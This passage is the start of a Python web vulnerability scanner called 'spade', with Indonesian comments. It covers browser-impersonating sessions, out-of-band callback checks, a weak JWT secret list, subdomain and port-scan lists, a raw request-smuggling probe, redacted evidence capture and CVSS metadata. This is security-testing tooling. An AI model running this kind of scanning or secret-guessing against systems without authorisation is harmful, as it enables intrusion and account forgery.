#!/usr/bin/env python3
"""
spade — Automated Web Vulnerability Scanner v3
================================================================
Cara pakai:
  python3 spade.py example.com                    # standard (default)
  python3 spade.py example.com --quick             # quick check
  python3 spade.py example.com --detailed          # full scan
  python3 spade.py example.com -o laporan.html     # custom output
  python3 spade.py example.com --csv hasil.csv     # export CSV
"""

import argparse
import base64
import csv
import hashlib
import hmac
import html as htmlmod
import json
import re
import secrets
import socket
import ssl
import sys
import threading
import time
import typing
import urllib.parse
from collections import OrderedDict, defaultdict, namedtuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from html.parser import HTMLParser

try:
    from curl_cffi.requests import BrowserType, BrowserTypeLiteral
    from curl_cffi.requests import Session as CurlSession
except ImportError:
    print("[!] Butuh 'curl_cffi'. Install: pip3 install curl_cffi")
    sys.exit(1)

# ── color ──
C = {
    "reset": "\033[0m", "bold": "\033[1m", "dim": "\033[2m",
    "red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m",
    "blue": "\033[94m", "magenta": "\033[95m", "cyan": "\033[96m",
    "bg_red": "\033[41m", "white": "\033[97m",
}
DISABLE_COLOR = False

_OUTPUT_LOCAL = threading.local()

def c(code, t):
    return t if DISABLE_COLOR else f"{C.get(code,'')}{t}{C['reset']}"

def _emit(line):
    """Tulis ke stdout, atau ke buffer thread-local saat modul dijalankan paralel."""
    buf = getattr(_OUTPUT_LOCAL, "buf", None)
    if buf is not None:
        buf.append(line + "\n")
    else:
        print(line)

def info(m):   _emit(f"  {c('blue','[*]')} {m}")
def good(m):   _emit(f"  {c('green','[v]')} {m}")
def warn(m):   _emit(f"  {c('yellow','[!]')} {m}")
def err(m):    _emit(f"  {c('red','[x]')} {m}")
def critical(m): _emit(f"  {c('bg_red',c('white','[!!]'))} {c('red',m)}")

_CTX_LOCK = threading.Lock()

def ctx_get(ctx, key, producer):
    """Cache hasil request yang mahal di dalam ctx agar tidak diulang antar modul."""
    if ctx is None:
        return producer()
    with _CTX_LOCK:
        if key in ctx:
            return ctx[key]
    value = producer()
    with _CTX_LOCK:
        ctx.setdefault(key, value)
    return ctx[key]

def get_base_response(sess, base_url, ctx=None):
    """GET halaman utama sekali, lalu pakai ulang di modul-modul pasif."""
    def _fetch():
        try:
            return sess.get(base_url, timeout=10)
        except Exception:
            return None
    return ctx_get(ctx, ("base_response", base_url), _fetch)

# ── helpers ──
def normalize_url(url):
    url = url.strip()
    if not re.match(r"^https?://", url, re.I):
        url = "https://" + url
    p = urllib.parse.urlparse(url)
    return f"{p.scheme}://{p.netloc}{p.path or '/'}"

def host_from_url(url): return urllib.parse.urlparse(url).netloc
def scheme_from_url(url): return urllib.parse.urlparse(url).scheme

def join(base, path):
    if path.startswith(("http://","https://")): return path
    return urllib.parse.urljoin(base, path)

# ══════════════════════════════════════════════════════════════════
# AUTH & OOB — prasyarat modul kelas kerentanan tingkat lanjut
# ══════════════════════════════════════════════════════════════════

# Daftar bawaan secret JWT lemah. Dipakai hanya untuk uji offline di mesin
# tester; kalau salah satu kata ini cocok, token bisa dipalsukan siapa pun.
DEFAULT_JWT_SECRETS = (
    "secret", "secret123", "secretkey", "password", "password123", "123456",
    "1234567890", "changeme", "jwt", "jwtsecret", "jwt_secret", "jwt-secret",
    "mysecret", "mysecretkey", "supersecret", "topsecret", "admin", "root",
    "test", "testing", "dev", "development", "default", "key", "apikey",
    "api_key", "token", "appsecret", "application_secret", "s3cr3t",
    "letmein", "qwerty", "spade", "example", "supersecretkey", "private",
    "jwtkey", "jwt-key", "django-insecure", "laravel", "symmetrickey",
)

OOB_CHECK_DELAY = 5.0      # jeda sebelum tanya collector (beri waktu callback masuk)
OOB_TIMEOUT = 5.0          # timeout cek collector
OOB_TOKEN_BYTES = 4        # panjang token callback (hex)
IDOR_MAX_CANDIDATES = 25   # batas URL objek yang diuji IDOR
PARAM_MAX_URLS = 8         # batas URL untuk parameter discovery
CRLF_MAX_PARAMS = 15       # batas parameter untuk uji CRLF
AUTH_BYPASS_MAX_PATHS = 10 # batas path terlindungi untuk uji auth bypass
JWT_CRAWL_TARGETS = 8    # batas halaman hasil crawl yang diuji sebagai orakel JWT

# ── Recon (bagian 3): enumerasi subdomain, URL historis, JS, port scan ──
# Semua nilai di bawah ini adalah batas request/berkas agar recon tidak
# membanjiri target maupun API pihak ketiga.
RECON_SOURCE_TIMEOUT = 20.0    # timeout sumber pasif (crt.sh, Cert Spotter, collinfo)
RECON_CDX_TIMEOUT = 45.0       # timeout Wayback CDX / Common Crawl (CDX terukur ~17s)
RECON_HOST_TIMEOUT = 8.0       # timeout probe HTTP per host hasil enumerasi
RECON_MAX_SUBDOMAINS = 200     # batas subdomain unik yang dilaporkan
RECON_DNS_TIMEOUT = 1.5        # timeout per lookup DNS brute force
RECON_MAX_HOSTS_PROBED = 25    # batas host hasil enumerasi yang di-probe HTTP
RECON_MAX_HISTORIC_URLS = 300  # batas URL historis unik
RECON_MAX_SEEDS = 6            # URL historis yang jadi seed crawler tambahan
RECON_PARAM_URLS = 5           # batas URL recon ber-query untuk modul injection
RECON_PARAM_NAMES = 5          # batas nama parameter per URL recon
RECON_JS_MAX_PAGES = 5         # halaman sumber daftar <script src>
RECON_JS_MAX_FILES = 15        # batas file JS yang dipanen
RECON_JS_MAX_ENDPOINTS = 50    # batas endpoint unik hasil ekstraksi JS
PORT_SCAN_TIMEOUT = 1.0        # timeout per port (TCP connect scan)
PORT_SCAN_MAX_HOSTS = 5        # host yang di-port-scan: target + host hidup

# Wordlist DNS internal (tanpa file eksternal) supaya enumerasi tetap punya
# jalur aktif saat layanan transparansi sertifikat tidak bisa diakses.
RECON_DNS_WORDLIST = tuple(dict.fromkeys((
    "www","mail","smtp","imap","pop","webmail","email","mx","ns1","ns2","ns3",
    "dns","dns1","dns2","vpn","remote","gateway","gw","proxy","firewall",
    "admin","administrator","panel","cpanel","whm","manage","management",
    "portal","intranet","internal","home","office","staff","hr","erp","crm",
    "api","api-v1","api-v2","apis","rest","graphql","webhook",
    "dev","development","staging","stage","stg","uat","qa","test","testing",
    "sandbox","demo","preview","beta","alpha","nightly","edge",
    "app","apps","application","mobile","m","wap","web","www2","www3","site",
    "shop","store","cart","checkout","pay","payment","payments","billing",
    "blog","news","press","media","assets","static","cdn","img","images","files",
    "download","downloads","upload","uploads","docs","documentation","wiki",
    "help","support","status","monitor","monitoring","metrics","grafana",
    "kibana","jenkins","ci","cd","git","gitlab","registry","docker","k8s",
    "kubernetes","vault","config","db","database","mysql","postgres","redis",
    "mongo","elastic","search","sso","auth","login","id","oauth","account",
    "accounts","user","users","profile","cloud","s3","backup",
)))

# Port umum + service non-HTTP yang paling sering jadi temuan bounty.
PORT_SCAN_PORTS = (
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 161, 389, 443, 445, 465,
    587, 631, 993, 995, 1433, 1521, 2049, 2375, 3000, 3306, 3389, 5000, 5432,
    5601, 5900, 6379, 8000, 8080, 8081, 8443, 8888, 9000, 9200, 11211, 27017,
)
PORT_SCAN_SERVICES = {
    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns", 80: "http",
    110: "pop3", 111: "rpcbind", 135: "msrpc", 139: "netbios", 143: "imap",
    161: "snmp", 389: "ldap", 443: "https", 445: "smb", 465: "smtps",
    587: "smtp-submission", 631: "ipp", 993: "imaps", 995: "pop3s",
    1433: "mssql", 1521: "oracle", 2049: "nfs", 2375: "docker-api",
    3000: "node-http", 3306: "mysql", 3389: "rdp", 5000: "dev-http",
    5432: "postgres", 5601: "kibana", 5900: "vnc", 6379: "redis",
    8000: "http-alt", 8080: "http-proxy", 8081: "http-alt", 8443: "https-alt",
    8888: "http-alt", 9000: "http-alt", 9200: "elasticsearch",
    11211: "memcached", 27017: "mongodb",
}
# Service yang tidak seharusnya terekspos ke internet: kalau terbuka, temuan
# dinaikkan jadi LOW supaya tidak tenggelam di daftar temuan INFO.
PORT_SCAN_RISKY_PORTS = frozenset({2375, 3306, 5432, 6379, 9200, 11211, 27017, 5601, 2049, 3389})

def oob_token():
    """Token callback unik per temuan OOB (aman dipakai di payload/log)."""
    return "spade-" + secrets.token_hex(OOB_TOKEN_BYTES)

def oob_base(oob_host):
    """Normalisasi --oob-host menjadi base URL collector tanpa trailing slash."""
    host = (oob_host or "").strip().rstrip("/")
    if not host:
        return ""
    if not host.startswith(("http://", "https://")):
        host = "http://" + host
    return host

def oob_callback_url(oob_host, token):
    """URL callback yang disematkan ke payload (harus bisa diakses target)."""
    return f"{oob_base(oob_host)}/{token}"

def oob_check(sess, oob_host, token):
    """Tanya collector milik tester apakah token ini pernah dipanggil.

    Kontrak collector (`tools/oob_collector.py`): `GET /<token>` mencatat
    callback, `GET /check?token=<token>` mengembalikan `{"token": .., "hits": n}`.
    Collector yang hanya mengembalikan body berisi token juga diterima.
    """
    base = oob_base(oob_host)
    if not base or not token:
        return False, "collector OOB tidak dikonfigurasi"
    url = f"{base}/check?token={urllib.parse.quote(token)}"
    try:
        r = sess.get(url, timeout=OOB_TIMEOUT)
    except Exception as exc:
        return False, f"gagal menghubungi collector: {type(exc).__name__}"
    try:
        payload = r.json()
    except Exception:
        payload = None
    if isinstance(payload, dict):
        try:
            hits = int(payload.get("hits", 0))
        except (TypeError, ValueError):
            hits = 0
        if hits > 0:
            return True, f"collector mencatat {hits} callback"
        return False, "belum ada callback"
    if token in (r.text or ""):
        return True, "collector mengembalikan token"
    return False, "belum ada callback"

def parse_cookie_arg(value):
    """Ubah satu argumen --cookie menjadi daftar pasangan cookie tervalidasi."""
    pairs = []
    for chunk in (value or "").split(";"):
        chunk = chunk.strip()
        if not chunk:
            continue
        name, sep, val = chunk.partition("=")
        name = name.strip()
        if not sep or not name:
            raise ValueError(f"format cookie tidak valid: {chunk!r} (butuh 'nama=nilai')")
        pairs.append(f"{name}={val.strip()}")
    if not pairs:
        raise ValueError("nilai --cookie kosong")
    return pairs

def parse_header_arg(value):
    """Ubah satu argumen -H/--header menjadi pasangan (nama, nilai)."""
    name, sep, val = (value or "").partition(":")
    name = name.strip()
    if not sep or not name:
        raise ValueError(f"format header tidak valid: {value!r} (butuh 'Nama: nilai')")
    return name, val.strip()

def build_auth_headers(cookies=(), headers=(), bearer=""):
    """Rakit header autentikasi dari --cookie/-H/--bearer.

    Cookie digabung jadi satu header `Cookie`; `--bearer` menolak digabung
    dengan header `Authorization` dari `-H` supaya tidak ada ambiguitas.
    """
    jar = []
    extra = OrderedDict()
    for raw in cookies or ():
        jar.extend(parse_cookie_arg(raw))
    has_auth_header = False
    for raw in headers or ():
        name, value = parse_header_arg(raw)
        if name.lower() == "cookie":
            jar.extend(parse_cookie_arg(value))
            continue
        if name.lower() == "authorization":
            has_auth_header = True
        extra[name] = value
    if bearer:
        if has_auth_header:
            raise ValueError("--bearer tidak bisa digabung dengan header Authorization dari -H")
        extra["Authorization"] = f"Bearer {bearer}"
    if jar:
        # Buang duplikat nama cookie (pemanggil terakhir menang, seperti browser).
        dedup = OrderedDict()
        for pair in jar:
            dedup[pair.split("=", 1)[0]] = pair
        extra["Cookie"] = "; ".join(dedup.values())
    return extra

def _redact_auth_headers(headers):
    """Versi aman-untuk-log dari header auth (dipakai di pesan terminal)."""
    return ", ".join(
        f"{name}=***" if name.lower() in ("cookie", "authorization") else f"{name}={value}"
        for name, value in (headers or {}).items()
    ) or "-"

def raw_http_probe(host, port, payload, use_tls=False, timeout=8.0, max_bytes=65536):
    """Kirim request HTTP mentah lewat socket, kembalikan respons mentah (bytes).

    Dipakai modul request smuggling: curl_cffi (dan curl) selalu menormalkan
    header sehingga CL.TE/TE.CL tidak bisa dikirim lewat jalur normal.
    """
    sock = None
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if use_tls:
            context = ssl._create_unverified_context()
            sock = context.wrap_socket(sock, server_hostname=host)
        sock.settimeout(timeout)
        sock.sendall(payload if isinstance(payload, bytes) else payload.encode())
        try:
            sock.shutdown(socket.SHUT_WR)
        except OSError:
            pass
        chunks = []
        total = 0
        while total < max_bytes:
            try:
                data = sock.recv(4096)
            except (socket.timeout, TimeoutError):
                break
            if not data:
                break
            chunks.append(data)
            total += len(data)
        return b"".join(chunks)
    except Exception:
        return None
    finally:
        if sock is not None:
            try:
                sock.close()
            except Exception:
                pass

def parse_raw_response(raw):
    """Urai respons HTTP mentah menjadi (status, headers, body_text)."""
    if not raw:
        return None, {}, ""
    text = raw.decode("utf-8", "replace")
    head, sep, body = text.partition("\r\n\r\n")
    if not sep:
        head, sep, body = text.partition("\n\n")
    lines = head.splitlines()
    status = None
    if lines:
        parts = lines[0].split()
        if len(parts) >= 2 and parts[1].isdigit():
            status = int(parts[1])
    headers = {}
    for line in lines[1:]:
        name, sep2, value = line.partition(":")
        if sep2:
            headers.setdefault(name.strip(), value.strip())
    return status, headers, body

# ── HTTP layer (curl_cffi) ──
DEFAULT_IMPERSONATE = "chrome"     # profil default: Chrome terbaru yang didukung curl_cffi
TRANSPORT_RETRIES = 1              # retry error koneksi/DNS/TLS (ditangani curl_cffi)
STATUS_RETRIES = 1                 # retry status 429/5xx (ditangani ThreadLocalSession)
RETRY_STATUS = frozenset({429, 500, 502, 503, 504})
RETRY_METHODS = frozenset({"GET", "POST", "HEAD", "OPTIONS"})
RETRY_AFTER_MAX = 5.0              # batas tunggu Retry-After agar scan tidak macet
_DEFAULT = object()                # sentinel: bedakan "pakai default" dari "tanpa impersonate"


def supported_impersonate_profiles():
    """Daftar profil yang diterima curl_cffi untuk --impersonate.

    Sumbernya BrowserTypeLiteral (mencakup nama berversi seperti 'chrome146'
    sekaligus alias generik seperti 'chrome' = Chrome terbaru), ditambah nama
    dari enum BrowserType sebagai cadangan untuk versi lama curl_cffi.
    """
    profiles = set(typing.get_args(BrowserTypeLiteral))
    profiles.update(m.name for m in BrowserType)
    return sorted(profiles)


def _retry_after_seconds(value):
    """Ubah header Retry-After (detik atau HTTP-date) jadi durasi tunggu, dibatasi RETRY_AFTER_MAX."""
    if not value:
        return 0.0
    value = value.strip()
    try:
        return max(0.0, min(float(value), RETRY_AFTER_MAX))
    except ValueError:
        pass
    try:
        from email.utils import parsedate_to_datetime
        stamp = parsedate_to_datetime(value)
        if stamp is None:
            return 0.0
        delta = (stamp - datetime.now(stamp.tzinfo)).total_seconds()
        return max(0.0, min(delta, RETRY_AFTER_MAX))
    except Exception:
        return 0.0


def make_session(timeout=15, verify_ssl=True, impersonate=_DEFAULT, extra_headers=None):
    """Buat satu curl_cffi Session dengan browser impersonation.

    User-Agent, sec-ch-ua, sec-fetch-*, dan Accept-Language tidak diset manual:
    nilainya berasal dari profil impersonate agar fingerprint TLS + header sama
    seperti browser asli (menyetel UA manual justru merusak paritas tersebut).
    Retry untuk error transport ditangani curl_cffi sendiri, sedangkan retry
    berdasarkan status HTTP (429/5xx) ditangani wrapper ThreadLocalSession.

    `extra_headers` (Cookie/Authorization/header dari -H) disuntikkan ke
    `session.headers` supaya ikut di setiap request. Header khas browser tetap
    datang dari profil impersonate saat request dikirim, jadi paritas
    fingerprint TLS + header tidak berubah.

    impersonate=None berarti impersonation dimatikan (mode paritas/debugging).
    """
    profile = DEFAULT_IMPERSONATE if impersonate is _DEFAULT else impersonate
    kwargs = {"timeout": timeout, "verify": verify_ssl, "retry": TRANSPORT_RETRIES}
    if profile:
        kwargs["impersonate"] = profile
    session = CurlSession(**kwargs)
    if extra_headers:
        session.headers.update(extra_headers)
    return session

# ══════════════════════════════════════════════════════════════════
# EVIDENCE — rekaman request/response sebagai bukti temuan
# ══════════════════════════════════════════════════════════════════

SPADE_VERSION = "3.1"

EVIDENCE_SNIPPET_CHARS = 500        # potongan respons di HTML & CSV
EVIDENCE_SNIPPET_CHARS_JSON = 2000  # potongan respons di JSON
EVIDENCE_MAX_KEYS = 512             # batas entri indeks bukti (per tipe indeks)
EVIDENCE_MAX_THREADS = 64           # batas entri indeks "request terakhir per thread"

# Redaksi aktif secara default: cookie, token, dan password tidak boleh ikut
# tersimpan di memori proses maupun di laporan hasil scan.
REDACT_ENABLED = True
REDACT_PLACEHOLDER = "***REDACTED***"
REDACTED_HEADERS = frozenset({
    "cookie", "set-cookie", "authorization", "proxy-authorization",
    "x-api-key", "x-csrf-token", "x-xsrf-token", "x-auth-token",
})
REDACT_BODY_KEY_RE = re.compile(
    r"pass|pwd|secret|token|api[_-]?key|auth|csrf|xsrf|session|otp|pin|credential", re.I
)

class Exchange:
    """Satu pasang request/response yang sudah di-redaksi, siap jadi bukti temuan.

    Dibuat otomatis di funnel `ThreadLocalSession.request()` supaya setiap
    temuan bisa menyertakan bukti asli (method, URL, status, header, body
    request, dan potongan respons) tanpa mengubah call site modul.
    """

    __slots__ = ("method", "url", "status", "request_headers", "request_body",
                 "response_headers", "response_snippet", "response_length",
                 "content_type", "elapsed_ms", "timestamp")

    def __init__(self, method, url, status, request_headers=None, request_body=None,
                 response_headers=None, response_snippet="", response_length=0,
                 content_type="", elapsed_ms=0.0, timestamp=None, redact=None):
        # Redaksi dilakukan di sini (bukan hanya saat serialisasi) supaya objek
        # Exchange yang dibuat langsung oleh pemanggil lain tidak pernah menyimpan
        # header/body/URL mentah berisi kredensial.
        self.method = (method or "GET").upper()
        self.url = redact_url(url or "", redact)
        self.status = status
        self.request_headers = redact_headers(request_headers, redact)
        self.request_body = redact_body(request_body, redact)
        self.response_headers = redact_headers(response_headers, redact)
        self.response_snippet = response_snippet or ""
        self.response_length = response_length or 0
        self.content_type = content_type or ""
        self.elapsed_ms = round(float(elapsed_ms or 0.0), 1)
        self.timestamp = timestamp or datetime.now().isoformat(timespec="seconds")

    @property
    def path(self):
        return urllib.parse.urlparse(self.url).path or "/"

    def to_dict(self, snippet_chars=EVIDENCE_SNIPPET_CHARS_JSON, redact=True):
        snippet = self.response_snippet
        truncated = len(snippet) > snippet_chars
        if truncated:
            snippet = snippet[:snippet_chars]
        return {
            "url": redact_url(self.url, redact),
            "method": self.method,
            "status": self.status,
            "content_type": self.content_type,
            "elapsed_ms": self.elapsed_ms,
            "timestamp": self.timestamp,
            "request_headers": self.request_headers,
            "request_body": self.request_body,
            "response_status": self.status,
            "response_length": self.response_length,
            "response_snippet": snippet,
            "response_truncated": truncated,
        }

    def __repr__(self):
        return f"Exchange({self.method} {self.url} -> {self.status})"

def _mask_header_value(name, value):
    """Sensor nilai header sensitif, tapi pertahankan bentuknya (mis. `sid=***`)."""
    if name.lower() in ("cookie", "set-cookie"):
        chunks = []
        for chunk in str(value).split(";"):
            chunk = chunk.strip()
            if "=" in chunk:
                chunks.append(f"{chunk.split('=', 1)[0]}={REDACT_PLACEHOLDER}")
            elif chunk:
                chunks.append(chunk)
        return "; ".join(chunks) if chunks else REDACT_PLACEHOLDER
    return REDACT_PLACEHOLDER

def redact_headers(headers, enabled=None):
    """Sensor header sensitif (Cookie/Authorization/API key) dari dict header."""
    if enabled is None:
        enabled = REDACT_ENABLED
    out = {}
    for name, value in (headers or {}).items():
        if enabled and name.lower() in REDACTED_HEADERS:
            out[name] = _mask_header_value(name, value)
        else:
            out[name] = value
    return out

def _redact_json_value(value):
    if isinstance(value, dict):
        return {k: (REDACT_PLACEHOLDER if REDACT_BODY_KEY_RE.search(str(k)) else _redact_json_value(v))
                for k, v in value.items()}
    if isinstance(value, list):
        return [_redact_json_value(v) for v in value]
    return value

def redact_body(body, enabled=None):
    """Sensor nilai field sensitif pada body request (form-urlencoded atau JSON)."""
    if enabled is None:
        enabled = REDACT_ENABLED
    if not enabled or body is None:
        return body
    if isinstance(body, (dict, list)):
        # Call site kadang sudah mengirim dict ke `data=`/`json=`; sensor
        # langsung struktur aslinya, jangan lewat repr Python (kunci sensitif
        # di repr tetap terbaca sebagai teks biasa).
        return json.dumps(_redact_json_value(body), ensure_ascii=False)
    text = body.decode("utf-8", "replace") if isinstance(body, bytes) else str(body)
    stripped = text.strip()
    if not stripped:
        return text
    if stripped[0] in "{[":
        try:
            return json.dumps(_redact_json_value(json.loads(stripped)), ensure_ascii=False)
        except ValueError:
            return text
    if "=" in stripped and not stripped.startswith("<"):
        chunks = []
        for chunk in stripped.split("&"):
            if "=" in chunk:
                key, _sep, _value = chunk.partition("=")
                chunks.append(f"{key}={REDACT_PLACEHOLDER}" if REDACT_BODY_KEY_RE.search(key) else chunk)
            else:
                chunks.append(chunk)
        return "&".join(chunks)
    return text

def redact_url(url, enabled=None):
    """Sensor nilai query parameter sensitif (mis. `?token=...`) di URL.

    Parameter yang tidak sensitif dibiarkan apa adanya (tidak di-encode ulang)
    supaya URL di laporan tetap identik dengan yang benar-benar dikirim.
    """
    if enabled is None:
        enabled = REDACT_ENABLED
    if not enabled or not url or "?" not in url:
        return url
    head, _sep, rest = url.partition("?")
    fragment = ""
    if "#" in rest:
        rest, _sep, fragment = rest.partition("#")
        fragment = "#" + fragment
    if not rest:
        return url
    masked = []
    for chunk in rest.split("&"):
        key, sep, _value = chunk.partition("=")
        if sep and REDACT_BODY_KEY_RE.search(urllib.parse.unquote_plus(key)):
            masked.append(f"{key}={REDACT_PLACEHOLDER}")
        else:
            masked.append(chunk)
    return head + "?" + "&".join(masked) + fragment

_EVIDENCE_LOCK = threading.Lock()
_EVIDENCE_BY_KEY = OrderedDict()          # (method, url) -> Exchange (terbaru menang)
_EVIDENCE_BY_PATH = OrderedDict()         # (method, path) -> Exchange
_EVIDENCE_LAST_BY_THREAD = {}             # thread id -> Exchange terakhir
EVIDENCE_BASE_URL = None                  # base URL scan, dipakai sebagai fallback

def set_evidence_base_url(url):
    """Tandai base URL scan sebagai fallback bukti untuk temuan tanpa URL."""
    global EVIDENCE_BASE_URL
    EVIDENCE_BASE_URL = url

def reset_evidence():
    """Bersihkan indeks bukti (dipakai di awal scan agar tidak bocor antar run/test)."""
    with _EVIDENCE_LOCK:
        _EVIDENCE_BY_KEY.clear()
        _EVIDENCE_BY_PATH.clear()
        _EVIDENCE_LAST_BY_THREAD.clear()
    set_evidence_base_url(None)

def record_exchange(exchange):
    """Simpan satu Exchange ke indeks bukti berbatas ukuran."""
    if exchange is None or not exchange.url:
        return exchange
    thread_id = threading.get_ident()
    with _EVIDENCE_LOCK:
        # Dua indeks terpisah supaya GET /a dan POST /a tidak saling menimpa:
        # kunci URL penuh untuk lookup persis, kunci path untuk fallback longgar.
        _remember(_EVIDENCE_BY_KEY, (exchange.method, exchange.url), exchange)
        _remember(_EVIDENCE_BY_PATH, (exchange.method, exchange.path), exchange)
        _EVIDENCE_LAST_BY_THREAD[thread_id] = exchange
        while len(_EVIDENCE_LAST_BY_THREAD) > EVIDENCE_MAX_THREADS:
            _EVIDENCE_LAST_BY_THREAD.pop(next(iter(_EVIDENCE_LAST_BY_THREAD)))
    return exchange

def _remember(index, key, exchange):
    """Simpan exchange ke OrderedDict berbatas, entri terlama dibuang lebih dulu."""
    index[key] = exchange
    index.move_to_end(key)
    while len(index) > EVIDENCE_MAX_KEYS:
        index.popitem(last=False)

def _lookup_by_url(url, method=None):
    """Cari exchange untuk URL ini; kalau `method` diberi, hanya cocokkan method itu."""
    if method:
        found = _EVIDENCE_BY_KEY.get((method.upper(), url))
        if found is not None:
            return found
    for (known_method, known_url), exchange in reversed(_EVIDENCE_BY_KEY.items()):
        if known_url == url:
            if method is None or known_method == method.upper():
                return exchange
    return None

def _lookup_by_path(path, method=None):
    """Cari exchange untuk path ini (tanpa query/host)."""
    if method:
        found = _EVIDENCE_BY_PATH.get((method.upper(), path))
        if found is not None:
            return found
    for (known_method, known_path), exchange in reversed(_EVIDENCE_BY_PATH.items()):
        if known_path == path:
            if method is None or known_method == method.upper():
                return exchange
    return None

def evidence_for(url=None, method=None):
    """Cari bukti request/response untuk sebuah temuan.

    Urutan pencarian: (method, URL) persis -> URL apa pun -> (method, path) ->
    path apa pun -> request terakhir di thread ini -> respons base URL scan ->
    None. Fallback ke "request terakhir di thread" penting karena banyak modul
    meng-append temuan langsung setelah request pemicunya di thread yang sama.
    """
    thread_id = threading.get_ident()
    with _EVIDENCE_LOCK:
        if url:
            found = _lookup_by_url(url, method) or _lookup_by_url(url)
            if found is not None:
                return found
            path = urllib.parse.urlparse(url).path or "/"
            found = _lookup_by_path(path, method) or _lookup_by_path(path)
            if found is not None:
                return found
        found = _EVIDENCE_LAST_BY_THREAD.get(thread_id)
        if found is not None:
            return found
        if EVIDENCE_BASE_URL:
            found = _lookup_by_url(EVIDENCE_BASE_URL) or _lookup_by_path(
                urllib.parse.urlparse(EVIDENCE_BASE_URL).path or "/")
            if found is not None:
                return found
    return None

def exchange_from_response(resp, method, elapsed_ms=0.0, kwargs=None, session_cookies=None):
    """Ubah Response curl_cffi menjadi Exchange yang sudah di-redaksi.

    `session_cookies` adalah isi cookie jar milik session yang dipakai. Cookie
    dikirim oleh curl di level engine (tidak muncul di `resp.request.headers`),
    jadi ditambahkan ke header bukti supaya langkah reproduksi temuan pada
    halaman terautentikasi tetap masuk akal — nilainya tetap disensor oleh
    `redact_headers()`.
    """
    kwargs = kwargs or {}
    request = getattr(resp, "request", None)
    request_headers = {}
    for source in (getattr(request, "headers", None), kwargs.get("headers")):
        if source:
            request_headers.update(dict(source))
    if session_cookies and not any(name.lower() == "cookie" for name in request_headers):
        jar = "; ".join(f"{name}={value}" for name, value in session_cookies)
        if jar:
            request_headers["Cookie"] = jar
    body = getattr(request, "body", None)
    if body is None:
        body = kwargs.get("data")
        if body is None:
            body = kwargs.get("json")
            if body is not None and not isinstance(body, (str, bytes)):
                body = json.dumps(body, ensure_ascii=False)
    if isinstance(body, bytes):
        body = body.decode("utf-8", "replace")
    raw = getattr(resp, "content", b"") or b""
    if not isinstance(raw, (bytes, bytearray)):
        raw = str(raw).encode("utf-8", "replace")
    if isinstance(raw, str):
        raw = raw.encode("utf-8", "replace")
    response_headers = dict(getattr(resp, "headers", None) or {})
    snippet = raw[:EVIDENCE_SNIPPET_CHARS_JSON * 4].decode("utf-8", "replace")[:EVIDENCE_SNIPPET_CHARS_JSON]
    return Exchange(
        method=method,
        url=str(getattr(resp, "url", "") or ""),
        status=getattr(resp, "status_code", None),
        request_headers=request_headers,
        request_body=body,
        response_headers=response_headers,
        response_snippet=snippet,
        response_length=len(raw),
        content_type=str(response_headers.get("Content-Type", "")),
        elapsed_ms=elapsed_ms,
    )

# ══════════════════════════════════════════════════════════════════
# FINDING — model temuan (kompatibel dengan tuple lama)
# ══════════════════════════════════════════════════════════════════

FindingMeta = namedtuple("FindingMeta", "vector score cwe owasp confidence")

_CVSS_NO_SCOPE_CHANGE = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U"

# Skor CVSS di tabel ini adalah skor referensi per kelas temuan (bukan hasil
# pengukuran runtime) dan dihitung dari vector CVSS 3.1 yang tertulis.
# Label severity Spade tetap jadi prioritas operasional; keduanya bisa berbeda.
FINDING_META = {
    "SENSITIVE_FILE":       FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-538", "A01:2021", "certain"),
    "PHP_INFO":             FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-200", "A05:2021", "firm"),
    "DIR_LISTING":          FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-548", "A01:2021", "firm"),
    "HTTP_METHOD":          FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:N/I:H/A:N", 7.5, "CWE-650", "A01:2021", "firm"),
    "TRACE_ENABLED":        FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-749", "A05:2021", "firm"),
    "SQLI":                 FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:H", 9.8, "CWE-89", "A03:2021", "firm"),
    "XSS_REFLECTED":        FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", 6.1, "CWE-79", "A03:2021", "firm"),
    "XSS_POST":             FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", 6.1, "CWE-79", "A03:2021", "firm"),
    "XSS_STORED":           FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", 6.1, "CWE-79", "A03:2021", "tentative"),
    "LFI":                  FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-22", "A01:2021", "firm"),
    "CMD_INJECTION":        FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:H", 9.8, "CWE-78", "A03:2021", "firm"),
    "CMD_INJECTION_POST":   FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:H", 9.8, "CWE-78", "A03:2021", "firm"),
    "SSRF":                 FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", 5.9, "CWE-918", "A10:2021", "tentative"),
    "SSRF_FORM":            FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", 5.9, "CWE-918", "A10:2021", "tentative"),
    "SSRF_TIMEOUT":         FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N", 3.7, "CWE-918", "A10:2021", "tentative"),
    "OPEN_REDIRECT":        FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", 6.1, "CWE-601", "A01:2021", "firm"),
    "XXE_DIRECT":           FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-611", "A05:2021", "firm"),
